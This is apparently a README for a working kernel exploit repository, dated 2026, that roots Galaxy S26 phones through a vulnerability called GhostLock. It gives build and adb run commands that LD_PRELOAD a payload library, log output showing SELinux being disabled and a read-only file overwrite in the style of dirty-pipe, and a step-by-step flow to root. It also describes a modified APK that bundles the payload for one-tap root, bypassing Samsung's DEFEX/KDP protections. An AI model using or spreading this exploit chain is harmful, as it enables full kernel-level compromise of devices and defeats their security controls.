# GhostLock (CVE-2026-43499) for Galaxy S26

As of 2026-08-11, other exploits for GhostLock don't work on S26. This repo utilize another method (dirty-pipe like file overwrite) to port it to S26 kernel.

Dirty-pipe like method can easily bypass samsung DEFEX/KDP and doesn't rely on ashmem. It is suitable for 6.12 kernel Galaxy devices (Galaxy S26 series).

All done via kernelsnitch'ed address or linearmap. The per-boot runtime slide is resolved on-device.

Currently supports the following devices.

| Payload             | Compatible models | Kernel version                                        | Status  |
| ------------------- | ----------------- | ----------------------------------------------------- | ------- |
| `m1q-S942QOPU1AZDE` | Galaxy S26        | `6.12.30-android16-5-pe553c2c-abogkiS942QOPU1AZDE-4k` | Working |
| `m3q-S9480ZCS4AZG1` | Galaxy S26 Ultra  | `6.12.30-android16-5-pe78e004-abogkiS9480ZCS4AZG1-4k` | Working |

For porting another device or another firmware version, modify target.h and rebuild it. See [PORTING.md](PORTING.md) for parameter derivation notes.

# Build

```sh
git clone (this repo)
cd (this repo)
cd IonStack/CVE-2026-43499/exploit
export ANDROID_NDK_HOME=(your ndk path)
make PROJECT=m3q-S9480ZCS4AZG1
```

And, build ksud + kernelsu.ko using [this tree](https://github.com/polygraphene/KernelSU/tree/a5531763971cf034e3f630d31654189a148e5f81) by [this instruction](https://github.com/BuSung-dev/Root-My-Galaxy-Payloads/blob/61a543e206bf503b54ffb2ac8329c2cd1b99a695/kernelsu/README.md).
This tree contains [a patch from BuSung-dev/Root-My-Galaxy](https://github.com/BuSung-dev/Root-My-Galaxy-Payloads/blob/61a543e206bf503b54ffb2ac8329c2cd1b99a695/kernelsu/patches/KernelSU-v3.2.5-samsung-kdp-rkp-defex.patch) and 6.12 adaptation.

# Run

```sh
$ adb push $KERNELSU/target/aarch64-linux-android/release/ksud /data/local/tmp
$ adb push (this repo)/IonStack/CVE-2026-43499/exploit/build/m3q-S9480ZCS4AZG1/bin/preload.so /data/local/tmp
$ adb shell env LD_PRELOAD=/data/local/tmp/preload.so sh
[14:14:27.742870] [+] preload starting pid=14437
[14:14:27.743073] [+] startup context pid=14437 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
[14:14:27.743096] [+] build config pid=14437 label=m3q-S9480ZCS4AZG1-pipe-flag slide=pselect main=pselect
[14:14:28.748061] [+] slide-kaslr-ok source=tracefs pid=14437 base=ffffffc080000000 slide=0000000000000000 p0_offset=00000000
[14:14:31.471694] [*] selinux phase. enforce=0
[14:14:32.469525] [*] Selinux phase done. Go to pipe flag phase.
[14:14:36.379289] [+] pipe overwrite succeeded.
[14:14:37.375240] [*] Executing setprop ctl.start vendor.modprobe

```

Then, install KernelSU Manager.

See [run.log](run.log) for full log.

logcat should include logs like the followings if succeeded.

```
$ logcat | grep GHOSTLOCK
08-12 11:09:19.905 24264 24264 I GHOSTLOCK: uid=0(root) gid=0(root) groups=0(root),1000(system) context=u:r:vendor_modprobe:s0
08-12 11:09:19.909 24265 24265 I GHOSTLOCK: [*] Am I root? uid=0
08-12 11:09:19.919 24265 24265 I GHOSTLOCK: [*] cp result=0
08-12 11:09:20.062 24265 24265 I GHOSTLOCK: [*] ksud result=0
```

# Flow

1. Disable selinux by vuln
2. Modify pipe flag by vuln (add `can_merge` flag)
3. Overwrite readonly file like dirty-pipe
4. Get root

## Modified App (Root-My-Galaxy 0.2.6-s26)

A modified build of [Root-My-Galaxy](https://github.com/BuSung-dev/Root-My-Galaxy) (`0.2.6-s26`, versionCode 13, based on upstream v0.2.6) is released in the repo root as `Root-My-Galaxy_v0.2.6-s26-release.apk`. The APK bundles the m3q payload (`preload.so` + `ksud`) for one-tap temporary root inside the app via Shizuku — no manual ADB commands are needed during install (Shizuku still requires a one-time ADB start, or wireless activation via Shizuku Manager). Custom payloads can be picked locally (Settings → Advanced → "Use local payload"), and SELinux enforcing can be viewed/toggled from the Settings page.

Usage: install the APK and start Shizuku → tap the "Bundled payload" card → select `m3q-S9480ZCS4AZG1` → confirm → wait for "KernelSU enabled".

> **Note**: Shizuku mode is required; root only lasts for the current boot (re-install after reboot); only the m3q (SM-S9480, CN) payload is bundled; **success rate is unknown** — verified only on the author's own device.

# Acknowledgments

- [Nebula Security](https://github.com/NebuSec/CyberMeowfia): Vulnerability and original exploit
- [@JoinChang](https://github.com/JoinChang/ghostlock-oneplus): Idea for disabling selinux
- [@BuSung-dev](https://github.com/BuSung-dev/Root-My-Galaxy): Idea for bypassing security of Samsung DEFEX/KDP and good documentation for porting
- [@veritas501](https://github.com/veritas501/pipe-primitive): Idea for triggering dirty-pipe like behavior from kernel memory corruption
- [@lukasmaar](https://github.com/lukasmaar/kernelsnitch): This exploit is heavily dependent on kernelsnitch
